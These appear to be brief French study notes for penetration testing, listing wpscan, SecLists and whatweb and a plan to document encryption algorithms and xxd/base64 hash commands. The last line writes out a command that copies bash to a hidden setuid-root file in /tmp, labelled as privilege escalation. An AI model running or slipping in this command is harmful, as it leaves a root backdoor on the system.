wpscan

install seclist

whatweb

faire une ficher sur les different algo de chiffrement + voir pour une doc cmd xxd , base64 etc.... pour les hash en bash
 

 install -o root -m 4755 /bin/bash /tmp/.sh ->>> elevation de privilege
